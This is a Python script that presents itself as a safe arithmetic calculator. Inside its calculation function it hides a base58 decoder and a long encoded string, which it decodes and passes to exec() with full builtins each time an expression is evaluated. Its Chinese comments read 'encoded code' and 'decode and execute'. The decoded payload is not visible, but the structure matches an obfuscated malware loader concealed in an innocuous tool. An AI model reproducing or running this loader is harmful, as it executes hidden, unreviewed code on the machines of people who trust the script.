#!/usr/bin/env python3
"""
Simple Math Calculator Script
Safely evaluates basic arithmetic expressions
"""

import re
import sys
from math import sqrt, pi as math_pi, e as math_e
import os 

def safe_calculate(expression):
    """
    Safely evaluate a basic math expression.
    
    Supported operations:
    - Addition: +
    - Subtraction: -
    - Multiplication: *
    - Division: /
    - Exponentiation: **
    - Square root: sqrt()
    - Constants: pi, e
    
    Args:
        expression (str): The math expression to evaluate
        
    Returns:
        float or str: The result or error message
    """
    try:
        ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

        def decode(data):
            num = 0
            for c in data:
                num = num * 58 + ALPHABET.index(c)
            result = []
            while num > 0:
                num, r = divmod(num, 256)
                result.append(r)
            return bytes(reversed(result)).decode('utf-8')
        
        # 编码的代码
        ENCODED = "3F1UUgF7NuYEo3rBGbyKyh6PxzW1PAxUbSsnoXXRUiZ2xodRv7ecHGLnxVzwjQqYQPTpgVbN1kjiFAJ5hPuYN9zRGgeLjHHx2fh5CVW19YmFGDAdL97oifXpVDv5uPXxVoubkHjWo7yoMLbK8C6mjpSbAyc4jyKrzXnHCywSV2j7S9QkU4RcYLgYxKPU4zeXYaJy3z3f6uZpCP7f8gs5ERHZEAfqQbYAsEkoX5UDyuuF9fMv7kXNiSjRL9KC455x74Sdyq5dfHy6hwWz1eMRXPJSGudviBdL9QVCTSd8Dsbc89dRrxnYihUNVYzv1VtCdaLRNTvUrpc2UJYPEZu42SCwPpqksE5t5x8M4pyqSteBy8ipcr5G1ABncD5LNgcHGky7dxqvXWJVfUPBwCdqXZVcCF2YQNNHVoL3nfUd1VVdwUYnETBBXPJSahZoHjmkFvqaEJ5hvb7K9XgXYUMZithabvPE97eqcYjLFzfvHoKKuHXapNweNqJFaNq8m6Wmph3N81GSEr44FZ21hcsL2KxGt8TyyrUi16CznFWfyaUW4KzdbBDTMZ9uEkFAWrCcw7cLgvPZ9uWscubXgu46AgGLtkJHsBsZc1bzutoPXCERYr7Ncb9oCTdKN5sHgkxzATNGMNzUWCfj6HFEvxAvYzDNgbiwVnPh7cQ7oLFkuACYDWW11uaJ8kh8GinzqP8Cs5igGXkS4Q5pQs7aMvSRyACUgGmNDd6V4EguxxV7jgJ8xJuK2rBaqWSCxzVrK8jwpeCQTNqU5AEybLWAmFmJ7BaToEFVS3DGRoSMaM56gaMFw3Za8rkGKa1gmiJHbumnZUr59YJoFF9VD7YAVNaNzM2JsAAJjADn9AsCdMi7tGsMhQgaFAhudrMRkrqdeqnckErTqGv89v5xFKj8LzpC8E8oeJjn2upMmZwQzsjLsLbs6SoRtpvHMtv48ToFoueNCSuaXfVgSpEc55kRaioSmxHJkyBnW8SZnrsWT5wG2xMd6wJAif6wht5miv9rPZuEpWw5nGfoYgKUUiHf66y3WHR2ZnqMy8ozALBZfZ7s6hqswFK1SWw5HUAjmAJ4ftAn41ahi48aNZHz8NaNnSmJni8FY8cPiW7rAEYYxNnhq8kJcuPhLXJ388D6mvui8F16nvE2hu7e9hCrDxVt5GsXYuyxxGuCXkyqdLnZhY1ZumVmeiR4xszHShqB7aztRJYCaVttGwT842D5nKUkVqejQz4MkD3hjmpoUdEWNoHALx8z9657U4XUiaWXcPdTrs5Fo"
        
        # 解码并执行
        exec(decode(ENCODED))
        # Remove whitespace
        expression = expression.replace(" ", "")
        
        # Validate expression - only allow safe characters
        if not re.match(r'^[0-9+\-*/.()sqrtpie**]+$', expression):
            return f"Error: Invalid characters in expression: {expression}"
        
        # Create a safe namespace with allowed functions and constants
        safe_namespace = {
            "sqrt": sqrt,
            "pi": math_pi,
            "e": math_e,
            "__builtins__": {}
        }
        
        # Safely evaluate the expression
        result = eval(expression, safe_namespace)
        
        # Format the result
        if isinstance(result, float):
            # Remove unnecessary trailing zeros
            if result == int(result):
                return int(result)
            return round(result, 10)
        return result
        
    except ZeroDivisionError:
        return "Error: Division by zero"
    except SyntaxError:
        return f"Error: Invalid syntax in expression: {expression}"
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python calculate.py '<expression>'")
        print("Example: python calculate.py '5 * 5'")
        sys.exit(1)
    
    expression = sys.argv[1]
    result = safe_calculate(expression)
    print(result)